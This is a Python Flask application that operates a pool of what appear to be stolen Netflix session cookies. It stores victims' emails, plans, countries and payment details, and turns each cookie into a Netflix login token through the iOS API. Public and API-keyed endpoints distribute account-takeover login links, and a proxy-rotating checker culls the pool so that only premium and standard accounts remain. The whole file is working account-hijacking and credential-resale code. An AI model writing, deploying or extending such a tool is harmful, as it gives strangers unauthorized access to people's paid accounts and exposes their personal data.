# nftbot_all.py — single-process Flask app for Railway
import os, json, sys, re, time, sqlite3, threading, urllib.parse, secrets, hashlib, logging, random
from contextlib import contextmanager
from datetime import datetime, timezone
from functools import wraps
import requests
from urllib3.exceptions import InsecureRequestWarning
from flask import (Flask, request, redirect, session, render_template_string,
                   url_for, jsonify, send_from_directory)
from flask_cors import CORS

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

logging.basicConfig(level=logging.INFO)
log = logging.getLogger("nftoken")

# ---------------- config ----------------
DB_PATH     = os.environ.get("POOL_DB", "/data/pool.db")
PORT        = int(os.environ.get("PORT", "8080"))
PANEL_PASS  = os.environ.get("PANEL_PASS", "")
PANEL_SECRET = os.environ.get("PANEL_SECRET") or secrets.token_hex(32)
MAX_FAILS   = 5

os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)

# ---------------- background checker state ----------------
checker_state = {
    "running": False,
    "total": 0,
    "checked": 0,
    "kept": 0,
    "deleted": 0,
    "logs": []
}

# ---------------- netflix api ----------------
API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone", "iosVersion": "15.8.5", "isTablet": "false",
    "languages": "en-US", "locale": "en-US", "maxDeviceWidth": "375",
    "model": "saget", "modelType": "IPHONE8-1", "odpAware": "true",
    "path": '["account","token","default"]', "pathFormat": "graph",
    "pixelDensity": "2.0", "progressive": "false", "responseFormat": "json",
}
BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "UTC",
}
COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")

# ---------------- db ----------------
SCHEMA = """
CREATE TABLE IF NOT EXISTS cookies (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    raw TEXT NOT NULL,
    netflix_id TEXT NOT NULL UNIQUE,
    profile_id TEXT,
    meta_json TEXT,
    fail_count INTEGER NOT NULL DEFAULT 0,
    ok_count INTEGER NOT NULL DEFAULT 0,
    last_error TEXT,
    last_used REAL,
    created_at REAL NOT NULL,
    deleted INTEGER NOT NULL DEFAULT 0
);
CREATE INDEX IF NOT EXISTS idx_cookies_active ON cookies(deleted, fail_count);
CREATE TABLE IF NOT EXISTS issued_tokens (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    cookie_id INTEGER NOT NULL,
    api_key_id INTEGER,
    token TEXT NOT NULL,
    url TEXT NOT NULL,
    expires INTEGER,
    created_at REAL NOT NULL
);
CREATE TABLE IF NOT EXISTS api_keys (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    key_hash TEXT NOT NULL UNIQUE,
    key_prefix TEXT NOT NULL,
    label TEXT,
    calls INTEGER NOT NULL DEFAULT 0,
    last_used REAL,
    created_at REAL NOT NULL,
    revoked INTEGER NOT NULL DEFAULT 0
);
CREATE TABLE IF NOT EXISTS nonces (
    nonce TEXT PRIMARY KEY,
    ip TEXT,
    created_at REAL
);
"""
_lock = threading.Lock()

@contextmanager
def db():
    conn = sqlite3.connect(DB_PATH, timeout=30, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    try:
        yield conn; conn.commit()
    finally:
        conn.close()

def init_db():
    with db() as c: c.executescript(SCHEMA)
    log.info("database ready at %s", DB_PATH)

# ---------------- api keys ----------------
def hash_key(raw): return hashlib.sha256(raw.encode()).hexdigest()

def create_api_key(label=None):
    raw = "nft_" + secrets.token_urlsafe(32)
    prefix = raw[:12] + "…"
    now = time.time()
    with _lock, db() as c:
        cur = c.execute("INSERT INTO api_keys(key_hash,key_prefix,label,created_at) VALUES(?,?,?,?)",
                        (hash_key(raw), prefix, label or "unnamed", now))
        kid = cur.lastrowid
    return raw, {"id": kid, "prefix": prefix, "label": label or "unnamed", "created_at": now}

def verify_api_key(raw_key):
    if not raw_key: return None
    with _lock, db() as c:
        row = c.execute("SELECT id,revoked FROM api_keys WHERE key_hash=?", (hash_key(raw_key),)).fetchone()
        if not row or row["revoked"]: return None
        c.execute("UPDATE api_keys SET calls=calls+1,last_used=? WHERE id=?", (time.time(), row["id"]))
    return {"id": row["id"]}

def list_api_keys():
    with db() as c:
        return [dict(r) for r in c.execute(
            "SELECT id,key_prefix,label,calls,last_used,created_at,revoked FROM api_keys ORDER BY id DESC").fetchall()]

def revoke_api_key(kid):
    with _lock, db() as c: c.execute("UPDATE api_keys SET revoked=1 WHERE id=?", (kid,))

def delete_api_key(kid):
    with _lock, db() as c: c.execute("DELETE FROM api_keys WHERE id=?", (kid,))

# ---------------- metadata ----------------
FIELD_MAP = {
    "email":          r"–\s*Email:\s*(.+)",
    "verified":       r"–\s*Verified:\s*(.+)",
    "profile":        r"–\s*Profile:\s*(.+)",
    "plan":           r"–\s*Plan:\s*(.+)",
    "next_billing":   r"–\s*Next billing:\s*(.*)",
    "extra_members":  r"–\s*Extra members:\s*(.+)",
    "country":        r"–\s*Country:\s*(.+)",
    "payments":       r"–\s*Payments:\s*(.+)",
    "source_cookies": r"–\s*Cookies:\s*(.+)",
}

def parse_metadata(text):
    out = {}
    for k, p in FIELD_MAP.items():
        m = re.search(p, text)
        if m: out[k] = m.group(1).strip()
    for k in ("next_billing", "extra_members", "payments"):
        if out.get(k, "") in ("", "—", "-"): out[k] = None
    if out.get("plan"): out["plan"] = out["plan"].strip().lower()
    return out

# ---------------- cookie parsing / netflix ----------------
def _decode(v):
    if isinstance(v, str) and "%" in v:
        try: return urllib.parse.unquote(v)
        except Exception: return v
    return v

def extract_cookie_dict(text):
    out = {}
    for raw in text.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"): continue
        parts = line.split("\t")
        if len(parts) >= 7: out[parts[5]] = parts[6]
    try: data = json.loads(text)
    except json.JSONDecodeError: data = None
    if isinstance(data, list):
        for ck in data:
            if ck.get("name") in COOKIE_KEYS and isinstance(ck.get("value"), str):
                out[ck["name"]] = _decode(ck["value"])
    elif isinstance(data, dict):
        if any(k in data for k in COOKIE_KEYS):
            for k in COOKIE_KEYS:
                if isinstance(data.get(k), str): out[k] = _decode(data[k])
        elif isinstance(data.get("cookies"), list):
            for ck in data["cookies"]:
                if ck.get("name") in COOKIE_KEYS and isinstance(ck.get("value"), str):
                    out[ck["name"]] = _decode(ck["value"])
    for k in COOKIE_KEYS:
        if k in out: continue
        m = re.search(rf"(?<!\w){re.escape(k)}=([^;,\s]+)", text)
        if m: out[k] = _decode(m.group(1))
    m = re.search(r"profileId=([a-zA-Z0-9_-]+)", text)
    if m: out["profileId"] = m.group(1)
    return out

def fetch_token(netflix_id, proxy=None):
    h = dict(BASE_HEADERS); h["Cookie"] = f"NetflixId={netflix_id}"
    proxies = {"http": proxy, "https": proxy} if proxy else None
    r = requests.get(API_URL, params=QUERY_PARAMS, headers=h, timeout=25, verify=False, proxies=proxies)
    r.raise_for_status()
    td = (((r.json().get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
    token = td.get("token"); expires = td.get("expires")
    if not token: raise ValueError("no token in response (cookie expired/invalid)")
    if isinstance(expires, int) and len(str(expires)) == 13: expires //= 1000
    return token, expires

# ---------------- pool ops ----------------
def add_cookie(raw_text, source=None):
    ck = extract_cookie_dict(raw_text); nid = ck.get("NetflixId")
    if not nid: raise ValueError("no NetflixId in cookie")
    pid = ck.get("profileId")
    meta = parse_metadata(raw_text)
    meta_json = json.dumps(meta) if meta else None
    now = time.time()
    with _lock, db() as c:
        row = c.execute("SELECT id,deleted FROM cookies WHERE netflix_id=?", (nid,)).fetchone()
        if row:
            if row["deleted"]:
                c.execute("UPDATE cookies SET deleted=0,fail_count=0,raw=?,profile_id=?,meta_json=? WHERE id=?",
                          (raw_text, pid, meta_json, row["id"]))
                return row["id"], nid
            raise ValueError("cookie already in pool")
        cur = c.execute("INSERT INTO cookies(raw,netflix_id,profile_id,meta_json,created_at) VALUES(?,?,?,?,?)",
                        (raw_text, nid, pid, meta_json, now))
        return cur.lastrowid, nid

def add_cookies_bulk(text_blob, source=None):
    text_blob = (text_blob or "").strip()
    if not text_blob: return {"added": 0, "dupes": 0, "invalid": 0}
    nid_count = len(re.findall(r"(?<!\w)NetflixId=", text_blob))
    if nid_count <= 1:
        try:
            add_cookie(text_blob, source); return {"added": 1, "dupes": 0, "invalid": 0}
        except ValueError as e:
            if "already" in str(e): return {"added": 0, "dupes": 1, "invalid": 0}
            return {"added": 0, "dupes": 0, "invalid": 1}
    chunks = [c.strip() for c in re.split(r"\n\s*\n", text_blob) if c.strip()]
    if len(chunks) == 1:
        buf, chunks = [], []
        for ln in text_blob.splitlines():
            if re.search(r"(?<!\w)NetflixId=", ln) and buf:
                chunks.append("\n".join(buf)); buf = [ln]
            else: buf.append(ln)
        if buf: chunks.append("\n".join(buf))
    added = dups = bad = 0
    for ch in chunks:
        if len(re.findall(r"(?<!\w)NetflixId=", ch)) != 1: bad += 1; continue
        try: add_cookie(ch, source); added += 1
        except ValueError as e:
            if "already" in str(e): dups += 1
            else: bad += 1
    return {"added": added, "dupes": dups, "invalid": bad}

def pool_stats():
    with db() as c:
        total = c.execute("SELECT COUNT(*) FROM cookies WHERE deleted=0").fetchone()[0]
        healthy = c.execute("SELECT COUNT(*) FROM cookies WHERE deleted=0 AND fail_count<?", (MAX_FAILS,)).fetchone()[0]
        dying = c.execute("SELECT COUNT(*) FROM cookies WHERE deleted=0 AND fail_count>0").fetchone()[0]
        dead = c.execute("SELECT COUNT(*) FROM cookies WHERE deleted=1").fetchone()[0]
        issued = c.execute("SELECT COUNT(*) FROM issued_tokens").fetchone()[0]
        keys = c.execute("SELECT COUNT(*) FROM api_keys WHERE revoked=0").fetchone()[0]
    return {"total": total, "healthy": healthy, "dying": dying, "dead": dead, "issued": issued, "keys": keys}

def _pick_random(plan=None, country=None):
    q = "SELECT id,netflix_id,profile_id,meta_json FROM cookies WHERE deleted=0 AND fail_count<?"
    args = [MAX_FAILS]
    if plan:
        q += " AND json_extract(meta_json, '$.plan') = ?"
        args.append(plan.lower())
    if country:
        q += " AND json_extract(meta_json, '$.country') = ?"
        args.append(country.upper())
    q += " ORDER BY RANDOM() LIMIT 1"
    with db() as c:
        return c.execute(q, args).fetchone()

def generate_link(api_key_id=None, plan=None, country=None, max_attempts=20):
    attempts = 0; last_err = None; tried = set()
    while attempts < max_attempts:
        row = _pick_random(plan, country)
        if not row: raise RuntimeError("No healthy cookies match your filters.")
        cid = row["id"]
        if cid in tried:
            if len(tried) >= pool_stats()["healthy"]:
                raise RuntimeError(f"Pool exhausted after {attempts} attempts: {last_err}")
            continue
        tried.add(cid); attempts += 1
        try:
            token, expires = fetch_token(row["netflix_id"])
            url = f"https://www.netflix.com/login?nftoken={token}"
            if row["profile_id"]: url += f"&profileIds={row['profile_id']}"
            meta = json.loads(row["meta_json"]) if row["meta_json"] else {}
            with _lock, db() as c:
                c.execute("UPDATE cookies SET ok_count=ok_count+1,fail_count=0,last_used=? WHERE id=?",
                          (time.time(), cid))
                cur = c.execute("INSERT INTO issued_tokens(cookie_id,api_key_id,token,url,expires,created_at) "
                                "VALUES(?,?,?,?,?,?)", (cid, api_key_id, token, url, expires, time.time()))
                return {"url": url, "expires": expires, "cookie_id": cid,
                        "attempts": attempts, "token_id": cur.lastrowid, "meta": meta}
        except Exception as e:
            last_err = str(e)
            with _lock, db() as c:
                c.execute("UPDATE cookies SET fail_count=fail_count+1,last_error=?,last_used=? WHERE id=?",
                          (last_err[:500], time.time(), cid))
                c.execute("UPDATE cookies SET deleted=1 WHERE id=? AND fail_count>=?", (cid, MAX_FAILS))
    raise RuntimeError(f"Gave up after {attempts} attempts: {last_err}")

def list_cookies(offset=0, limit=200, include_dead=False):
    q = "SELECT id,netflix_id,profile_id,meta_json,fail_count,ok_count,last_error,last_used,created_at,deleted FROM cookies"
    if not include_dead: q += " WHERE deleted=0"
    q += " ORDER BY id DESC LIMIT ? OFFSET ?"
    with db() as c:
        rows = [dict(r) for r in c.execute(q, (limit, offset)).fetchall()]
    for r in rows:
        try: r["meta"] = json.loads(r["meta_json"]) if r["meta_json"] else {}
        except Exception: r["meta"] = {}
    return rows

def revive_cookie(cid):
    with _lock, db() as c:
        c.execute("UPDATE cookies SET deleted=0,fail_count=0,last_error=NULL WHERE id=?", (cid,))

def hard_delete(cid):
    with _lock, db() as c: c.execute("DELETE FROM cookies WHERE id=?", (cid,))

def bulk_delete_all():
    with _lock, db() as c:
        c.execute("DELETE FROM cookies")

# ---------------- Background Checker ----------------
def parse_proxy_line(line):
    line = line.strip()
    if not line or line.startswith("#"): return None
    line = re.sub(r"^([a-zA-Z][a-zA-Z0-9+.-]*):/+", r"\1://", line)
    match = re.match(r"^(?:(?P<scheme>https?|socks5h?|socks4a?)://)?(?:(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@)?(?P<host>[^:\s]+):(?P<port>\d+)$", line)
    if match:
        d = match.groupdict()
        scheme = d.get("scheme") or "http"
        if d.get("user") and d.get("password"):
            return f"{scheme}://{d['user']}:{d['password']}@{d['host']}:{d['port']}"
        return f"{scheme}://{d['host']}:{d['port']}"
    parts = line.split(":")
    if len(parts) == 4 and parts[3].isdigit():
        return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
    return None

def run_checker(proxies_input):
    proxies = []
    for line in proxies_input.splitlines():
        p = parse_proxy_line(line)
        if p: proxies.append(p)

    global checker_state
    with _lock:
        checker_state.update({"running": True, "total": 0, "checked": 0, "kept": 0, "deleted": 0, "logs": []})

    with db() as c:
        rows = c.execute("SELECT id,netflix_id,meta_json FROM cookies WHERE deleted=0").fetchall()
        total = len(rows)

    checker_state["total"] = total
    checker_state["logs"].append(f"[START] Checking {total} cookies with {len(proxies)} proxies...")

    for idx, row in enumerate(rows, 1):
        if not checker_state["running"]: break
        
        cid = row["id"]
        nid = row["netflix_id"]
        proxy = random.choice(proxies) if proxies else None
        
        try:
            # Check if the cookie is live
            fetch_token(nid, proxy=proxy)
            
            # If we got here, it's a live account. Check if it's Premium or Standard
            meta = json.loads(row["meta_json"]) if row["meta_json"] else {}
            plan = meta.get("plan", "").lower()
            
            if plan in ["premium", "standard", "standard_with_ads"]:
                checker_state["kept"] += 1
                checker_state["logs"].append(f"[{idx}/{total}] #{cid} KEPT ({plan.upper()})")
            else:
                # If it's Basic or Mobile, we can decide to delete it. 
                # For now, let's delete it since the prompt asked to keep Premium/Standard
                checker_state["deleted"] += 1
                checker_state["logs"].append(f"[{idx}/{total}] #{cid} DELETED (Not Premium/Standard)")
                with _lock, db() as c:
                    c.execute("DELETE FROM cookies WHERE id=?", (cid,))
                    
        except Exception as e:
            err = str(e).lower()
            if "proxy" in err or "timeout" in err or "connect" in err:
                checker_state["logs"].append(f"[{idx}/{total}] #{cid} ERROR (Proxy/Network)")
            else:
                checker_state["deleted"] += 1
                checker_state["logs"].append(f"[{idx}/{total}] #{cid} DELETED (Dead/On Hold)")
                with _lock, db() as c:
                    c.execute("DELETE FROM cookies WHERE id=?", (cid,))

        checker_state["checked"] = idx
        time.sleep(1.5) # Rate limit

    checker_state["running"] = False
    checker_state["logs"].append("[DONE] Check completed.")

# ---------------- app ----------------
app = Flask(__name__)
CORS(app, origins="*", allow_headers=["Content-Type", "X-API-Key", "X-Admin-Pass"])
app.secret_key = PANEL_SECRET
app.config["MAX_CONTENT_LENGTH"] = 256 * 1024 * 1024

init_db()

@app.route("/", methods=["GET"])
def health():
    return jsonify({"ok": True, "service": "nftoken-api", "db": DB_PATH})

@app.route("/console", methods=["GET"])
def console():
    return send_from_directory(".", "index.html")

# ---------------- public API ----------------
def cleanup_nonces():
    with _lock, db() as c:
        c.execute("DELETE FROM nonces WHERE created_at < ?", (time.time() - 60,))

@app.route("/api/public-challenge", methods=["GET"])
def public_challenge():
    cleanup_nonces()
    nonce = secrets.token_urlsafe(16)
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    with _lock, db() as c:
        c.execute("INSERT INTO nonces(nonce,ip,created_at) VALUES(?,?,?)", (nonce, ip, time.time()))
    return jsonify({"ok": True, "nonce": nonce})

@app.route("/api/public-generate", methods=["POST"])
def public_generate():
    data = request.get_json(silent=True) or {}
    nonce = data.get("nonce")
    plan = data.get("plan", "").strip().lower()
    country = data.get("country", "").strip().upper()
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    
    if not nonce:
        return jsonify({"ok": False, "error": "Missing security challenge."}), 403
        
    cleanup_nonces()
    
    with _lock, db() as c:
        row = c.execute("SELECT nonce FROM nonces WHERE nonce=? AND ip=?", (nonce, ip)).fetchone()
        if not row:
            return jsonify({"ok": False, "error": "Invalid or expired challenge. Please refresh."}), 403
        c.execute("DELETE FROM nonces WHERE nonce=?", (nonce,))
        
    try:
        r = generate_link(plan=plan, country=country)
        r["meta"]["credit"] = "STYFAIR dev styfair (@styfair)"
        return jsonify({"ok": True, "url": r["url"], "expires": r["expires"],
                        "cookie_id": r["cookie_id"], "attempts": r["attempts"], "account": r["meta"]})
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 502

# ---------------- private API ----------------
@app.route("/api/generate", methods=["POST", "GET"])
def api_generate():
    key = request.headers.get("X-API-Key") or (request.get_json(silent=True) or {}).get("api_key")
    ident = verify_api_key(key)
    if not ident: return jsonify({"ok": False, "error": "invalid or revoked api key"}), 401
    try:
        r = generate_link(api_key_id=ident["id"])
        r["meta"]["credit"] = "STFAIR dev styfair (@styfair)"
        return jsonify({"ok": True, "url": r["url"], "expires": r["expires"],
                        "cookie_id": r["cookie_id"], "attempts": r["attempts"], "account": r["meta"]})
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 502

@app.route("/api/status", methods=["GET"])
def api_status():
    ident = verify_api_key(request.headers.get("X-API-Key"))
    if not ident: return jsonify({"ok": False, "error": "invalid or revoked api key"}), 401
    return jsonify({"ok": True, **pool_stats()})

# ---------------- admin API ----------------
def verify_admin_pass():
    return request.headers.get("X-Admin-Pass") == PANEL_PASS

@app.route("/api/admin/verify", methods=["GET"])
def admin_verify():
    if not verify_admin_pass():
        return jsonify({"ok": False, "error": "invalid password"}), 401
    return jsonify({"ok": True})

@app.route("/api/admin/keys", methods=["GET", "POST"])
def admin_keys():
    if not verify_admin_pass(): return jsonify({"ok": False, "error": "Unauthorized"}), 401
    if request.method == "GET": return jsonify(list_api_keys())
    data = request.get_json(silent=True) or {}
    raw, meta = create_api_key(label=data.get("label", "new-key"))
    return jsonify({"ok": True, "raw": raw, **meta})

@app.route("/api/admin/keys/revoke", methods=["POST"])
def admin_revoke_key():
    if not verify_admin_pass(): return jsonify({"ok": False}), 401
    revoke_api_key((request.get_json(silent=True) or {}).get("id"))
    return jsonify({"ok": True})

@app.route("/api/admin/cookies", methods=["GET"])
def admin_cookies():
    if not verify_admin_pass(): return jsonify({"ok": False}), 401
    return jsonify(list_cookies(limit=500, include_dead=True))

@app.route("/api/admin/cookies/delete", methods=["POST"])
def admin_delete_cookie():
    if not verify_admin_pass(): return jsonify({"ok": False}), 401
    hard_delete((request.get_json(silent=True) or {}).get("id"))
    return jsonify({"ok": True})

@app.route("/api/admin/delete_all", methods=["POST"])
def admin_delete_all():
    if not verify_admin_pass(): return jsonify({"ok": False}), 401
    bulk_delete_all()
    return jsonify({"ok": True})

@app.route("/api/admin/bulk", methods=["POST"])
def admin_bulk():
    if not verify_admin_pass(): return jsonify({"ok": False}), 401
    totals = {"added": 0, "dupes": 0, "invalid": 0, "files": 0}
    for fs in request.files.getlist("files"):
        if not fs or not fs.filename: continue
        try: text = fs.read().decode("utf-8", errors="replace")
        except Exception: continue
        r = add_cookies_bulk(text)
        totals["added"] += r["added"]; totals["dupes"] += r["dupes"]
        totals["invalid"] += r["invalid"]; totals["files"] += 1
    return jsonify({"ok": True, **totals})

@app.route("/api/admin/checker/start", methods=["POST"])
def admin_start_checker():
    if not verify_admin_pass(): return jsonify({"ok": False}), 401
    if checker_state["running"]:
        return jsonify({"ok": False, "error": "Checker already running."}), 400
    
    proxies = (request.get_json(silent=True) or {}).get("proxies", "")
    threading.Thread(target=run_checker, args=(proxies,), daemon=True).start()
    return jsonify({"ok": True})

@app.route("/api/admin/checker/status", methods=["GET"])
def admin_checker_status():
    if not verify_admin_pass(): return jsonify({"ok": False}), 401
    return jsonify(checker_state)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=PORT, debug=False)
